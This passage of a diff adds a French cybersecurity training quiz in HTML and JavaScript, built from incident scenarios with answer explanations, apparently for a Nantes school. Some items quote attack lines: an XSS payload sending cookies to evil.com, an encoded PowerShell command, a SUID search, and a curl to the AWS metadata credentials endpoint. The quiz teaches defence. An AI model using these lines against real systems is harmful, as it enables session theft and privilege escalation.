+{scenario:"Une entreprise utilise des certificats SSL avec SHA-1 sur son site de paiement. Son prestataire recommande de migrer vers SHA-256.",q:"Pourquoi SHA-1 est-il problématique ?",opts:["SHA-1 est trop lent pour les serveurs modernes","SHA-1 ne supporte pas les certificats wildcard","SHA-1 est incompatible avec TLS 1.3","SHA-1 a été cassé cryptographiquement (collision attack démontrée) et n'est plus considéré comme sûr"],ans:3,exp:"En 2017, Google a démontré une <b>attaque par collision SHAttered</b> contre SHA-1. SHA-256 (famille SHA-2) et SHA-3 sont les standards actuels recommandés."},
+{scenario:"Après un incident, l'équipe forensique trouve dans les logs : 'powershell.exe -EncodedCommand UABhAHMAcwB3AG8AcgBkAA==' exécuté à 3h du matin.",q:"Que révèle cette commande ?",opts:["Une mise à jour automatique de Windows","Un script de sauvegarde légitime","Une défragmentation automatique du disque","Un attaquant utilisant l'obfuscation PowerShell pour exécuter du code malveillant encodé en Base64"],ans:3,exp:"La commande <b>-EncodedCommand</b> de PowerShell exécute du code encodé en Base64 pour contourner les détections. C'est une technique LOLBAS très utilisée pour éviter les antivirus."},
+{scenario:"Un utilisateur clique sur un lien malveillant et son navigateur exécute : document.location='https://evil.com/steal?cookie='+document.cookie",q:"De quelle attaque s'agit-il ?",opts:["Une attaque CSRF","Une injection SQL","Un clickjacking","Un Cross-Site Scripting (XSS) visant à voler les cookies de session"],ans:3,exp:"C'est du <b>XSS (Cross-Site Scripting)</b> : injection de JavaScript malveillant qui s'exécute dans le navigateur. Protection : Content Security Policy, flag HttpOnly sur les cookies."},
+{scenario:"L'équipe sécurité découvre qu'un ex-employé licencié il y a 3 mois a encore accès à l'ERP de l'entreprise avec son compte actif.",q:"Quel processus de sécurité n'a pas été respecté ?",opts:["La politique de mot de passe fort","La segmentation réseau","Le chiffrement des données de l'ERP","Le processus d'offboarding — révocation immédiate des accès lors du départ"],ans:3,exp:"L'<b>offboarding sécurisé</b> impose la révocation immédiate de tous les accès lors du départ. Les comptes orphelins permettent à un ex-employé mécontent d'accéder aux données sensibles."},
+{scenario:"Un attaquant a compromis le serveur de mise à jour d'un logiciel de comptabilité utilisé par 40 000 entreprises, injectant un malware dans une mise à jour légitime.",q:"Comment s'appelle ce type d'attaque ?",opts:["Une attaque DDoS sur la chaîne logistique","Un ransomware ciblé","Une attaque par phishing de masse","Une supply chain attack (attaque de la chaîne d'approvisionnement logicielle)"],ans:3,exp:"La <b>supply chain attack</b> (comme SolarWinds en 2020) compromet un fournisseur de confiance pour atteindre ses clients. La mise à jour légitime devient le vecteur d'infection."},
+{scenario:"Un RSSI remarque que son IDS génère 50 000 alertes par jour, dont 99,9% sont des faux positifs. L'équipe ne peut plus distinguer les vraies menaces.",q:"Comment s'appelle ce problème et quelle est la solution ?",opts:["Log overflow — augmenter la capacité de stockage","Bandwidth saturation — ajouter de la bande passante","Alert flooding — réduire le nombre de capteurs IDS","Alert fatigue — implémenter un SIEM avec corrélation d'événements et tuning des règles"],ans:3,exp:"L'<b>alert fatigue</b> est critique en cybersécurité opérationnelle. La solution : un <b>SIEM</b> corrèle les événements, réduit le bruit et priorise les alertes."},
+{scenario:"Lors d'un audit de code, un chercheur trouve : memcpy(buffer, user_input, strlen(user_input)) sans vérification de la taille de buffer (fixé à 64 octets).",q:"De quelle vulnérabilité s'agit-il ?",opts:["Une injection SQL dans le code C","Une fuite mémoire (memory leak)","Une race condition","Un buffer overflow permettant potentiellement l'exécution de code arbitraire"],ans:3,exp:"Le <b>buffer overflow</b> : si user_input dépasse 64 octets, les données débordent sur la mémoire adjacente. Un attaquant peut y placer du shellcode. Protection : utiliser strncpy, langages memory-safe (Rust), ASLR."},
+{scenario:"Un hacker éthique prouve qu'il peut se connecter au Wi-Fi WPA2 d'une entreprise en capturant le 4-way handshake et en lançant une attaque dictionnaire offline.",q:"Quelle mesure réduit drastiquement ce risque ?",opts:["Passer au Wi-Fi WEP qui est plus récent","Cacher le SSID du réseau","Limiter la puissance du signal Wi-Fi","Utiliser WPA3 et des mots de passe longs et aléatoires pour le Wi-Fi"],ans:3,exp:"<b>WPA3</b> utilise SAE qui résiste aux attaques dictionnaire offline. Un mot de passe Wi-Fi long et aléatoire rend l'attaque computationnellement impossible même avec WPA2."},
+{scenario:"Une application mobile bancaire stocke le token d'authentification en clair dans les SharedPreferences Android, accessible à toute application avec les droits root.",q:"Quelle est la bonne pratique pour stocker des secrets sur mobile ?",opts:["Chiffrer le token avec MD5 avant de le stocker","Stocker le token dans une variable en mémoire RAM uniquement","Encoder le token en Base64","Utiliser le Keystore système Android/iOS Secure Enclave avec chiffrement hardware"],ans:3,exp:"Le <b>Keystore Android</b> et le <b>Secure Enclave iOS</b> stockent les secrets dans une enclave hardware isolée, inaccessible même avec les droits root. Base64 et MD5 ne sont pas du chiffrement."},
+{scenario:"Lors d'un pentest, l'équipe Red Team accède à un serveur via une vulnérabilité web, puis obtient les privilèges root en exploitant un binaire SUID mal configuré.",q:"Comment s'appelle cette technique ?",opts:["Lateral movement","Credential stuffing","Pass-the-hash","Privilege escalation via SUID exploitation"],ans:3,exp:"La <b>privilege escalation</b> via SUID : un binaire avec le bit SUID s'exécute avec les droits du propriétaire (souvent root). Si mal configuré, il peut être détourné. La commande find / -perm -4000 liste ces fichiers."},
+{scenario:"Un chercheur en sécurité découvre une vulnérabilité critique dans OpenSSL utilisée par des millions de serveurs. Il en informe OpenSSL avant de la publier.",q:"Comment s'appelle cette pratique éthique de divulgation ?",opts:["Bug bounty program","Full disclosure immédiate","Zero-day exploitation","Responsible disclosure (divulgation responsable)"],ans:3,exp:"La <b>responsible disclosure</b> consiste à notifier le vendeur en privé, lui laisser le temps de corriger, puis publier. C'est l'approche éthique qui protège les utilisateurs."},
+{scenario:"Une entreprise de e-commerce française traite des paiements CB mais n'est pas certifiée PCI-DSS. Suite à une intrusion, 10 000 numéros de carte sont volés.",q:"Quelles sont les conséquences potentielles de la non-conformité PCI-DSS ?",opts:["Uniquement une amende symbolique de 100€ par carte","Obligation de rembourser uniquement les clients ayant signalé une fraude","Aucune conséquence légale car PCI-DSS n'est pas une loi française","Amendes des réseaux CB, retrait du droit de traiter des paiements, et responsabilité des transactions frauduleuses"],ans:3,exp:"<b>PCI-DSS</b> est obligatoire pour tout acteur traitant des données de cartes. Les amendes vont de 5 000$ à 100 000$/mois. En cas de violation, l'entreprise peut perdre le droit d'accepter les paiements CB."},
+{scenario:"L'équipe IT configure un nouveau serveur web et laisse actifs FTP (port 21), Telnet (port 23) et SNMP v1 par défaut.",q:"Quel principe de sécurité fondamental est violé ?",opts:["Defense in depth","Principle of least privilege","Zero Trust architecture","Réduction de la surface d'attaque — désactiver tout service non nécessaire"],ans:3,exp:"La <b>réduction de la surface d'attaque</b> impose de désactiver tout service non utilisé. FTP et Telnet transmettent les données en clair. Les scanners automatiques trouvent ces services en minutes."},
+{scenario:"Un attaquant compromet le compte email d'un fournisseur et modifie les coordonnées bancaires sur les prochaines factures PDF.",q:"Comment s'appelle cette fraude et comment la détecter ?",opts:["Man-in-the-Middle réseau","Phishing de facturation — détectée par antivirus","Ransomware ciblé — détecté par IDS","Fraude au RIB / BEC — détectée par rappel téléphonique sur un numéro connu"],ans:3,exp:"La <b>fraude au RIB</b> est une des plus coûteuses au monde. La seule parade : confirmer tout changement de RIB par un appel téléphonique sur un numéro préalablement connu."},
+{scenario:"Lors d'un test de phishing interne, 35% des employés d'une banque ont cliqué sur le lien malveillant et 20% ont saisi leurs identifiants.",q:"Quelle est la meilleure réponse long terme ?",opts:["Sanctionner les employés ayant cliqué","Bloquer tous les emails externes","Changer les mots de passe de tous les employés","Mettre en place un programme de sensibilisation continu et des simulations régulières de phishing"],ans:3,exp:"La <b>sensibilisation continue</b> (security awareness) réduit de 70% les taux de clic. Sanctionner est contre-productif : les employés n'osent plus signaler les incidents."},
+{scenario:"Un chercheur découvre une faille zero-day dans un routeur grand public permettant l'exécution de code à distance sans authentification.",q:"Pourquoi une faille 'zero-day' est-elle particulièrement dangereuse ?",opts:["Elle est détectée par tous les antivirus immédiatement","Elle n'affecte que les vieux systèmes non mis à jour","Elle nécessite un accès physique à l'appareil","Il n'existe aucun patch au moment de sa découverte — les systèmes sont vulnérables sans remède immédiat"],ans:3,exp:"Un <b>zero-day</b> est une vulnérabilité inconnue du fabricant. Il n'existe aucun patch, aucune signature antivirus. La défense repose sur la segmentation réseau et la détection comportementale (EDR)."},
+{scenario:"Une entreprise pharmaceutique française est ciblée par un groupe APT qui exfiltre des données via des connexions HTTPS chiffrées vers des serveurs légitimes dans le cloud.",q:"Pourquoi les solutions de sécurité traditionnelles peinent-elles à détecter cette exfiltration ?",opts:["Les firewalls bloquent uniquement HTTP, pas HTTPS","HTTPS garantit que les données ne peuvent pas être interceptées","Les antivirus ne scannent pas les fichiers envoyés via HTTPS","Le trafic est chiffré et utilise des services cloud légitimes — nécessite une inspection TLS et une analyse comportementale (UEBA)"],ans:3,exp:"L'exfiltration via HTTPS chiffré vers des services légitimes contourne les firewalls. La détection requiert l'<b>inspection TLS</b>, l'<b>analyse comportementale UEBA</b> et des solutions DLP."},
+{scenario:"Après un ransomware, une entreprise restaure ses sauvegardes mais réalise que celles-ci étaient aussi chiffrées car stockées sur le même réseau.",q:"Quelle règle de sauvegarde aurait évité ce scénario ?",opts:["Compresser les sauvegardes en ZIP avec un mot de passe","Sauvegarder uniquement les données critiques","Utiliser un antivirus sur le serveur de sauvegarde","Appliquer la règle 3-2-1-1-0 : 3 copies, 2 médias, 1 hors site, 1 offline/air-gapped, 0 erreur vérifiée"],ans:3,exp:"La règle <b>3-2-1-1-0</b> impose une copie <b>air-gapped</b> (physiquement déconnectée du réseau). Les ransomwares modernes cherchent et chiffrent activement les sauvegardes réseau."},
+{scenario:"Un hacker vend sur le dark web l'accès initial à 50 entreprises françaises compromises, sans les exploiter lui-même.",q:"Comment s'appelle ce rôle dans l'économie cybercriminelle moderne ?",opts:["Threat actor","Script kiddie","Ransomware operator","Initial Access Broker (IAB) — une économie souterraine spécialisée"],ans:3,exp:"Les <b>Initial Access Brokers (IAB)</b> sont spécialisés dans la compromission initiale et la revente d'accès. Ils alimentent les opérateurs de ransomware (RaaS) dans une économie cybercriminelle très spécialisée."},
+{scenario:"Un analyste threat intelligence identifie que son entreprise est ciblée par le groupe APT29 (Cozy Bear) documenté dans le framework MITRE ATT&CK.",q:"Comment ce framework aide-t-il concrètement la défense ?",opts:["Il fournit des signatures antivirus pour les malwares connus","Il remplace les outils SIEM dans la détection","Il liste les CVE exploitées par chaque groupe APT","Il mappe les comportements d'attaque connus pour identifier les lacunes défensives et prioriser les contrôles de sécurité"],ans:3,exp:"<b>MITRE ATT&CK</b> est une knowledge base des TTPs adversariales. Il permet de cartographier la couverture défensive et de créer des règles de détection basées sur les comportements."},
+],
+avance:[
+{scenario:"Lors d'une analyse forensique, l'attaquant a utilisé 'pass-the-hash' pour se propager latéralement dans le domaine Active Directory sans connaître les mots de passe en clair.",q:"Quelle fonctionnalité Windows doit être activée pour mitiger cette technique ?",opts:["Windows Defender Antivirus","Le chiffrement Kerberos AES-256 uniquement","BitLocker sur tous les postes","Protected Users Security Group + Credential Guard (virtualisation basée sur la sécurité)"],ans:3,exp:"<b>Windows Credential Guard</b> utilise la virtualisation (VBS) pour stocker les hachages NTLM dans un environnement isolé, rendant le pass-the-hash impossible. Le <b>Protected Users Group</b> désactive NTLM et force Kerberos."},
+{scenario:"Un pentest cryptographique révèle que l'application utilise ECB pour chiffrer des données structurées. Le testeur peut déterminer qu'un utilisateur est admin sans déchiffrer.",q:"Pourquoi le mode ECB est-il fondamentalement cassé ?",opts:["ECB chiffre chaque bloc indépendamment — des blocs identiques en clair produisent des blocs identiques en chiffré, révélant les patterns structurels","ECB est trop lent pour les données structurées","ECB utilise des clés trop courtes (64 bits)","ECB est vulnérable aux padding oracle attacks contrairement à CBC"],ans:0,exp:"En <b>ECB</b>, AES(K, P1) = AES(K, P2) si P1 = P2. La structure des données est visible dans le chiffré. Utiliser <b>AES-GCM</b> (authentifié) ou AES-CBC avec IV aléatoire."},
+{scenario:"Un red team réussit à contourner un EDR en injectant un shellcode directement en mémoire via Process Hollowing, sans jamais écrire sur le disque.",q:"Comment s'appelle cette technique et quelle défense est adaptée ?",opts:["SQL injection mémoire — déployer un WAF","Buffer overflow classique — activer ASLR","Rootkit noyau — réinstaller le système","Fileless malware — déployer ETW tracing, Memory Integrity (HVCI) et surveiller les anomalies d'allocation mémoire"],ans:3,exp:"Le <b>fileless malware</b> n'écrit jamais sur le disque. La défense : <b>ETW (Event Tracing for Windows)</b> pour capturer les appels API suspects, <b>HVCI</b> pour protéger la mémoire noyau."},
+{scenario:"L'analyse d'un malware révèle qu'il utilise des requêtes DNS TXT vers des domaines générés algorithmiquement pour recevoir ses commandes et exfiltrer des données.",q:"Quelles techniques de détection sont adaptées ?",opts:["Bloquer DNS sur le firewall périmétrique","Utiliser uniquement DNS over HTTPS","Passer à DNS over TLS (DoT)","DNS anomaly detection (longueur, entropie, fréquence) + DGA detection par ML + RPZ (Response Policy Zone)"],ans:3,exp:"Le <b>DNS tunneling</b> encode des données dans les requêtes DNS. Détection : analyse de l'entropie des sous-domaines, longueur anormale des requêtes TXT, fréquence élevée. Les modèles ML comme DeepDGA détectent les DGA en temps réel."},
+{scenario:"Lors d'un audit OAuth2, le chercheur découvre que l'application accepte n'importe quel redirect_uri sans validation stricte.",q:"Quel scénario d'attaque cela permet-il ?",opts:["SQL Injection dans le flux OAuth","CSRF sur le flux d'authentification uniquement","Brute force du code d'autorisation","Open Redirect + Authorization Code Interception : un attaquant récupère le code d'autorisation en contrôlant la redirection"],ans:3,exp:"Sans validation stricte du <b>redirect_uri</b>, un attaquant peut substituer son URI et récupérer le code d'autorisation OAuth, puis obtenir les tokens d'accès de la victime."},
+{scenario:"Un attaquant accède à une base de données de 1 million de mots de passe hashés avec MD5 non salé. Il récupère 70% des mots de passe en 10 minutes.",q:"Pourquoi MD5 non salé est-il si rapidement cassé ?",opts:["MD5 est trop court (128 bits)","Le problème est l'absence de pepper, pas l'algorithme","MD5 n'utilise pas de sel par conception","Les rainbow tables précalculent tous les hashs MD5. Solution : bcrypt/Argon2id avec salt unique par utilisateur"],ans:3,exp:"Les <b>rainbow tables</b> pré-calculent des millions de paires (mot de passe → hash MD5). <b>Argon2id</b> est memory-hard et résistant aux GPU/ASIC. Le sel unique empêche les rainbow tables."},
+{scenario:"Une application web implémente le JWT avec l'algorithme 'alg: none' après avoir traité une requête malveillante.",q:"Comment un attaquant exploite-t-il cette vulnérabilité JWT ?",opts:["En déchiffrant le JWT avec une clé publique","En cassant la signature HMAC-SHA256 par force brute","En rejouant un token expiré avec un timestamp modifié","En modifiant le header JWT pour forcer alg:none, supprimant la signature — le serveur accepte sans vérification"],ans:3,exp:"La vulnérabilité <b>JWT 'alg:none'</b> : l'attaquant modifie le payload (ex: role:'admin'), supprime la signature et force alg:none. Le serveur accepte le token sans vérification cryptographique."},
+{scenario:"Un test de sécurité cloud révèle qu'un bucket S3 d'une startup est accessible publiquement et contient des clés AWS, des tokens Stripe et des données clients.",q:"Quel outil de détection continue aurait prévenu cette exposition ?",opts:["Un antivirus cloud","Un pentest annuel","AWS CloudTrail uniquement","CSPM (Cloud Security Posture Management) + AWS Config avec règles de conformité automatisées"],ans:3,exp:"Un <b>CSPM</b> comme AWS Security Hub ou Wiz scanne en continu la configuration cloud et alerte immédiatement sur les mauvaises configurations (buckets publics, secrets exposés, policies permissives)."},
+{scenario:"L'équipe forensique découvre que le malware communique avec son C2 avec des intervalles de connexion suivant une distribution normale µ=3600s et σ=300s.",q:"Pourquoi cette technique de beaconing est-elle difficile à détecter ?",opts:["Car le trafic est chiffré avec AES-256","Car le C2 est hébergé sur une infrastructure cloud légitime","Car le malware utilise le protocole ICMP","Car les intervalles irréguliers imitent un comportement humain et contournent les détections basées sur des périodes fixes"],ans:3,exp:"Le <b>jitter de beaconing</b> ajoute une variation aléatoire aux intervalles. La détection requiert une analyse statistique sur de longues périodes et la détection d'anomalies par ML."},
+{scenario:"Une fuite de mémoire dans OpenSSL expose les 4096 octets précédents en mémoire lors d'un heartbeat TLS malformé. Cette vulnérabilité a affecté des millions de serveurs en 2014.",q:"De quelle vulnérabilité s'agit-il et quelle leçon architecturale en tirer ?",opts:["Shellshock — utiliser des langages interprétés","POODLE — désactiver SSL 3.0","Spectre/Meltdown — mettre à jour le microcode CPU","Heartbleed (CVE-2014-0160) dans OpenSSL — les langages memory-safe (Rust, Go) et les audits de code des bibliothèques critiques sont essentiels"],ans:3,exp:"<b>Heartbleed</b> : une seule ligne de code manquante a exposé des clés privées SSL de millions de serveurs. Les langages <b>memory-safe</b> comme Rust auraient rendu ce bug impossible."},
+{scenario:"Lors d'un red team exercise, l'équipe passe de l'accès initial à Domain Admin en 4 heures via Kerberoasting.",q:"Quelle mesure réduit le plus efficacement l'impact du Kerberoasting ?",opts:["Désactiver Kerberos et utiliser NTLM","Patcher tous les contrôleurs de domaine","Activer la journalisation Kerberos avancée","Utiliser des mots de passe longs et aléatoires pour les comptes de service + Group Managed Service Accounts (gMSA)"],ans:3,exp:"Le <b>Kerberoasting</b> demande des tickets TGS pour les comptes de service et les craque offline. Les <b>gMSA</b> gèrent automatiquement la rotation de mots de passe de 240 bits, rendant le cassage impossible."},
+{scenario:"Un CISO doit justifier l'investissement cybersécurité au board en termes business.",q:"Quel framework de quantification du risque cyber exprime le risque en valeur financière ?",opts:["NIST CSF (Cybersecurity Framework)","ISO 27001 uniquement","OWASP Risk Rating Methodology","FAIR (Factor Analysis of Information Risk) — quantifie LEF et LM pour calculer l'exposition financière annuelle (ALE)"],ans:3,exp:"<b>FAIR</b> quantifie le risque cyber en termes financiers : Loss Event Frequency × Loss Magnitude = Annualized Loss Expectancy. Il permet de prioriser les investissements sécurité par ROI."},
+{scenario:"Un chercheur démontre une attaque Spectre/Meltdown sur des processeurs Intel. L'attaque lit la mémoire d'autres processus via l'exécution spéculative.",q:"Pourquoi ces vulnérabilités sont-elles fondamentalement différentes des CVE classiques ?",opts:["Car elles affectent uniquement les serveurs","Car elles nécessitent un accès physique au processeur","Car elles sont impossibles à détecter","Car elles exploitent le design même des microprocesseurs modernes — les correctifs logiciels (retpoline, KPTI) dégradent les performances de 5-30%"],ans:3,exp:"<b>Spectre/Meltdown</b> exploitent des fonctionnalités fondamentales des CPU (exécution spéculative). Les correctifs <b>KPTI</b> et <b>retpoline</b> désactivent partiellement ces optimisations, causant une dégradation des performances."},
+{scenario:"Lors d'une analyse forensique, vous découvrez que l'attaquant a utilisé des outils natifs Windows (certutil, bitsadmin, wmic) pour toutes ses actions post-exploitation.",q:"Comment s'appelle cette technique et pourquoi est-elle redoutable ?",opts:["APT technique — car elle vient d'un groupe étatique","Fileless malware — car aucun fichier n'est créé","Lateral movement — car elle permet de se déplacer dans le réseau","Living Off the Land (LOLBAS) — car elle utilise des outils légitimes qui ne déclenchent pas les antivirus basés sur les signatures"],ans:3,exp:"<b>LOLBAS (Living Off the Land Binaries and Scripts)</b> utilise des outils légitimes du système d'exploitation. Certutil peut télécharger des fichiers, bitsadmin exécuter des scripts. Les antivirus signatures ne les détectent pas — nécessite une détection comportementale (EDR)."},
+{scenario:"Un audit de sécurité révèle que l'application utilise des tokens de session de 32 bits générés avec Math.random() en JavaScript.",q:"Pourquoi Math.random() est-il inadapté pour la cryptographie ?",opts:["Il est trop lent pour générer des tokens en production","Il ne génère que des nombres entre 0 et 1","Il est incompatible avec TLS 1.3","Math.random() est un PRNG non cryptographique — sa sortie est prédictible si le seed est connu. Utiliser crypto.getRandomValues() ou /dev/urandom"],ans:3,exp:"<b>Math.random()</b> est un PRNG (Pseudo Random Number Generator) déterministe non cryptographique. Un attaquant qui connaît ou déduit le seed peut prédire tous les tokens. Utiliser <b>crypto.getRandomValues()</b> (Web Crypto API) ou <b>crypto.randomBytes()</b> en Node.js."},
+{scenario:"Une entreprise active l'inspection TLS (SSL inspection) sur son proxy sortant pour détecter les exfiltrations. Les employés utilisent des applications bancaires et médicales.",q:"Quel problème éthique et technique cela soulève-t-il ?",opts:["L'inspection TLS ralentit trop le réseau pour être utilisable","L'inspection TLS viole le chiffrement de bout en bout des communications privées — nécessite une politique claire, un bypass pour les sites sensibles et une information des employés","L'inspection TLS n'est pas légale en France","L'inspection TLS ne fonctionne pas sur les protocoles QUIC et HTTP/3"],ans:1,exp:"L'<b>inspection TLS</b> installe un certificat racine d'entreprise pour déchiffrer tout le trafic. Elle viole le secret des communications privées (bancaires, médicales). Elle nécessite une politique d'utilisation acceptable, un bypass explicite pour les sites sensibles et une information préalable des salariés (CNIL)."},
+{scenario:"L'équipe Red Team simule une attaque sur une infrastructure industrielle (ICS/SCADA) contrôlant une station d'épuration d'eau.",q:"Pourquoi la sécurité des systèmes industriels (OT) est-elle fondamentalement différente de la sécurité IT classique ?",opts:["Les systèmes OT sont toujours déconnectés d'Internet","Les systèmes OT utilisent des protocoles propriétaires impossibles à auditer","La sécurité OT n'existe pas comme discipline","Les systèmes OT privilégient la disponibilité et la sécurité physique sur la confidentialité — les patches et redémarrages peuvent arrêter des processus critiques pendant des heures"],ans:3,exp:"La <b>triade CIA en OT</b> est inversée : Availability > Integrity > Confidentiality. Un patch non testé peut arrêter une turbine ou ouvrir une vanne. Les cycles de patch sont de mois ou années. La segmentation réseau IT/OT (zone DMZ industrielle) est la priorité absolue."},
+{scenario:"Un pentest de l'infrastructure cloud révèle qu'un rôle IAM de développeur a les permissions 'iam:PassRole' et 'ec2:RunInstances' non restreintes.",q:"Quel scénario d'escalade de privilèges cela permet-il ?",opts:["Aucune escalade possible sans accès à la console AWS","Uniquement une lecture des métadonnées EC2","Un accès en lecture seule aux buckets S3","Créer une instance EC2 avec un rôle admin, puis récupérer les credentials via le service de métadonnées IMDS — escalade vers un accès admin complet"],ans:3,exp:"La combinaison <b>iam:PassRole + ec2:RunInstances</b> est un vecteur d'escalade classique : créer une instance EC2 en lui passant un rôle admin, puis curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ pour obtenir les credentials temporaires admin."},
+{scenario:"Lors d'une investigation forensique, l'analyste doit préserver les preuves d'un serveur Linux compromis avant l'extinction.",q:"Quel est le bon ordre des opérations selon les principes de forensique numérique ?",opts:["Éteindre le serveur, puis analyser le disque dur","Prendre un snapshot VM, puis éteindre le serveur","Formater le disque et réinstaller le système","Capturer la mémoire RAM (volatility), puis l'image disque, puis analyser — du plus volatil au moins volatil"],ans:3,exp:"L'<b>ordre de volatilité</b> (RFC 3227) : RAM (processus, connexions réseau, clés de chiffrement) → cache/swap → disque → logs. La RAM est perdue à l'extinction. <b>Volatility</b> capture la mémoire, <b>dd/FTK Imager</b> l'image disque, sans modifier les timestamps (montage en lecture seule)."},
+{scenario:"Un groupe de ransomware publie 10 Go de données volées d'une entreprise française sur leur 'leak site' du dark web, réclamant 2 millions d'euros.",q:"Pourquoi payer la rançon est-il généralement déconseillé même quand les données sont publiées ?",opts:["Car c'est illégal dans tous les cas en France","Car les attaquants fournissent rarement la clé de déchiffrement fonctionnelle","Car le montant est toujours trop élevé","Car payer finance les futures attaques, ne garantit ni la clé ni la suppression des données, et peut violer les sanctions OFAC si le groupe est listé"],ans:3,exp:"Payer une rançon : finance l'écosystème criminel, ne garantit pas la suppression des données volées (souvent revendues quand même), peut violer les sanctions <b>OFAC (Office of Foreign Assets Control)</b> si le groupe est listé, et fait de l'entreprise une cible récurrente. L'ANSSI recommande de ne pas payer."},
+{scenario:"Un développeur implémente une protection CSRF avec un token stocké dans un cookie SameSite=Lax et vérifié côté serveur.",q:"Dans quel scénario cette protection peut-elle être contournée ?",opts:["Elle ne peut jamais être contournée avec SameSite=Lax","Si l'attaquant connaît le token CSRF de la victime","Si le site utilise HTTPS","Les requêtes GET de navigation top-level envoient le cookie SameSite=Lax — si des actions sensibles utilisent GET au lieu de POST, la protection est inefficace"],ans:3,exp:"<b>SameSite=Lax</b> envoie le cookie sur les navigations top-level (liens, redirections) mais pas les requêtes cross-site initiées par JavaScript. Si une action sensible (virement, suppression) utilise une requête GET, SameSite=Lax ne protège pas. Utiliser <b>SameSite=Strict</b> ou s'assurer que toutes les actions sensibles utilisent POST/PUT/DELETE."},
+]
+};
+
+let selNiv='debutant',questions=[],current=0,score=0,answered=false,userAnswers=[];
+const nc={debutant:{bg:'#E1F5EE',c:'#0F6E56',label:'Niveau 0'},intermediaire:{bg:'#E6F1FB',c:'#0C447C',label:'Intermédiaire'},avance:{bg:'#FAEEDA',c:'#633806',label:'Maîtrise'}};
+
+function selectNiv(btn){document.querySelectorAll('.niv-btn').forEach(b=>b.classList.remove('active'));btn.classList.add('active');selNiv=btn.dataset.niv;}
+function startQuiz(){questions=allQ[selNiv];document.getElementById('welcomeScreen').style.display='none';document.getElementById('quizArea').style.display='block';render();}
+
+function render(){
+  const pct=Math.round((current/questions.length)*100);
+  document.getElementById('progressBar').style.width=pct+'%';
+  if(current>=questions.length){showResult();return;}
+  const q=questions[current];const n=nc[selNiv];
+  document.getElementById('qContent').innerHTML=`
+    <div class="q-meta"><span class="q-counter">Question ${current+1} sur ${questions.length}</span><span class="q-badge" style="background:${n.bg};color:${n.c}">${n.label}</span></div>
+    <span class="case-tag">Cas réel</span>
+    <div class="scenario">${q.scenario}</div>
+    <p class="question">${q.q}</p>
+    <div class="options">${q.opts.map((o,i)=>`<button type="button" class="opt" data-i="${i}">${o}</button>`).join('')}</div>
+    <div id="fb"></div>
+    <button type="button" class="btn-next" id="btnNext" disabled>Question suivante</button>`;
+  document.querySelectorAll('.opt').forEach(b=>b.addEventListener('click',()=>select(b)));
+  document.getElementById('btnNext').addEventListener('click',next);
+}
+
+function select(btn){
+  if(answered)return;answered=true;
+  const i=parseInt(btn.dataset.i);const q=questions[current];
+  userAnswers.push({q:q.q,chosen:q.opts[i],correct:q.opts[q.ans],ok:i===q.ans});
+  document.querySelectorAll('.opt').forEach((b,idx)=>{if(idx===q.ans)b.classList.add('correct');else if(idx===i)b.classList.add('wrong');b.style.pointerEvents='none';});
+  const fb=document.getElementById('fb');
+  if(i===q.ans){score++;fb.innerHTML=`<div class="feedback ok">Correct. ${q.exp}</div>`;}
+  else{fb.innerHTML=`<div class="feedback ko">Incorrect. ${q.exp}</div>`;}
+  document.getElementById('btnNext').disabled=false;
+}
+function next(){answered=false;current++;render();}
+
+function niveauRes(n){
+  if(n>=18)return{t:"Expert Cybersécurité",c:"background:#E1F5EE;color:#0F6E56"};
+  if(n>=14)return{t:"Niveau Avancé",c:"background:#E6F1FB;color:#0C447C"};
+  if(n>=10)return{t:"Niveau Intermédiaire",c:"background:#FAEEDA;color:#633806"};
+  if(n>=6)return{t:"Niveau Fondamentaux",c:"background:#FAECE7;color:#993C1D"};
+  return{t:"Débutant — Formation recommandée",c:"background:#f0f4f8;color:#555"};
+}
+
+function showResult(){
+  const note=Math.round((score/questions.length)*20);const niv=niveauRes(note);
+  document.getElementById('progressBar').style.width='100%';
+  const low=note<12;
+  const accomp=low
+    ?`<div class="accomp-box"><div class="accomp-title">Jonas School vous accompagne</div><p>Votre score révèle un besoin de formation en cybersécurité. Jonas School lance sa formation Cybersécurité encadrée par <b>Mme Gautier Hayet</b>, Ingénieure en IA.<br><br>Nous formons les futurs bâtisseurs d'une France numérique sécurisée.</p><p class="contact-line">108 Bvd Robert Schuman, 44300 Nantes · contact@jonas-school.com</p></div>`
+    :`<div class="accomp-box success"><div class="accomp-title">Excellent niveau en cybersécurité</div><p>Jonas School propose des formations avancées en Pentesting, Red Team, Architecture Zero Trust et Cybersécurité IA. Rejoignez nos futurs bâtisseurs de la France de demain.</p><p class="contact-line">contact@jonas-school.com · 108 Bvd Robert Schuman, 44300 Nantes</p></div>`;
+  const recap=userAnswers.map(a=>`<div class="recap-item"><span class="recap-status ${a.ok?'ok':'ko'}">${a.ok?'OK':'KO'}</span><span><b>${a.q}</b><br>Votre réponse : <i>${a.chosen}</i>${!a.ok?' — Correct : <b>'+a.correct+'</b>':''}</span></div>`).join('');
+  document.getElementById('qContent').innerHTML=`
+    <div class="result-header">
+      <p style="font-size:12px;color:#999;margin-bottom:.4rem;text-transform:uppercase;letter-spacing:.5px;font-weight:700">Résultat final — Quiz Cybersécurité</p>
+      <div class="score-big">${note}<span style="font-size:26px;color:#999;font-weight:400">/20</span></div>
+      <div class="score-sub">${score} bonne${score>1?'s':''} réponse${score>1?'s':''} sur ${questions.length}</div>
+      <span class="niveau-result" style="${niv.c}">${niv.t}</span>
+    </div>
+    ${accomp}
+    <div class="sig-block"><div class="sig-logo">JS</div><div class="sig-text"><b>Jonas School — Formation Cybersécurité</b><br>Mme Gautier Hayet, Ingénieure en IA<br><em>Nous formons les futurs bâtisseurs de la France de demain</em><br>108 Bvd Robert Schuman, 44300 Nantes · contact@jonas-school.com</div></div>
+    <div class="recap"><p class="recap-title">Récapitulatif complet</p>${recap}</div>
+    <button type="button" class="btn-restart" id="btnRestart">Recommencer le quiz</button>`;
+  document.getElementById('btnRestart').addEventListener('click',()=>{current=0;score=0;answered=false;userAnswers=[];document.getElementById('quizArea').style.display='none';document.getElementById('welcomeScreen').style.display='block';});
+}
+</script>
+</body>
+</html>
